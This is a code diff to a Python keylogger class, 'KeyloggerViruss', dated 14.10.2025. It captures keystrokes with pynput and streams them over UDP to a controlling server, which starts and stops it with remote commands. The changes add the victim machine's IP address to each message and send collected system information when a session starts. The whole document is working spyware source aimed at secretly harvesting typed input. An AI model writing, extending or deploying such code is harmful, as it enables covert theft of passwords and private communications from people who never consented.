@@ -6,20 +6,26 @@ data: 14.10.2025
 This script implements a keylogger that listens for UDP commands to start and stop logging keystrokes.
 When started, it captures keystrokes and sends them via UDP to a specified server.
 """
+import signal
 
+from pyexpat.errors import messages
 from pynput.keyboard import Listener
 import socket
 import json
-from config import special_keys
+from typing import Optional, Dict
+from config import special_keys, IP
+from utils import get_all_local_ips, get_system_info
 
 
 class KeyloggerViruss():
     def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
         self.host = host
+        self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
         self.port_listen = port_listen
         self.port_send = port_send
         self.FLAG_ACTIVE = False
         self.listener = None
+        self.is_active_server = False
 
     def send_udp_message(self, message: str, signal: bool = True, timeout: float = 2.0):
         """
@@ -33,7 +39,8 @@ class KeyloggerViruss():
             try:
                 request = {
                     "signal": signal,
-                    "message": message
+                    "message": message,
+                    "from_ip": self.ip_self,
                 }
                 sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                 print(f"Sent {sent} bytes to {self.host}:{self.port_send}")
@@ -48,7 +55,7 @@ class KeyloggerViruss():
                 key = special_keys[key]
             else:
                 key = str(key).replace("'", "")
-            self.send_udp_message(message=key)
+            self.send_udp_message(message=key, signal=True)
         except AttributeError:
             pass
 
@@ -71,8 +78,13 @@ class KeyloggerViruss():
         self.FLAG_ACTIVE = False
         print("Keyboard monitor STOPPED")
 
-    def run_keylogger(self, buffer_size: int = 4096):
+    def start_session(self):
         self.start_monitor()
+        message = get_system_info(target_ip=IP)
+        self.send_udp_message(message=message, signal=True)
+
+
+    def run_keylogger(self, buffer_size: int = 4096):
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -82,15 +94,20 @@ class KeyloggerViruss():
         try:
             while True:
                 try:
+                    if not self.is_active_server:
+                        self.start_session()
+
                     data, _ = sock.recvfrom(buffer_size)
                     data = json.loads(data.decode())
-                    if data.get("command", ""):
+
+                    if data.get("command", "") == "Server_active":
+                        self.is_active_server = True
+                    elif data.get("command", "") == "start":
                         self.start_monitor()
-                    elif not data.get("command", ""):
+                    elif data.get("command", "") == "stop":
                         self.stop_monitor()
                         message = "[KEYLOGGER STOPPED]"
-                        signal = False
-                        self.send_udp_message(message=message, signal=signal)
+                        self.send_udp_message(message=message, signal=False)
                         return
                 except json.JSONDecodeError as e:
                     pass
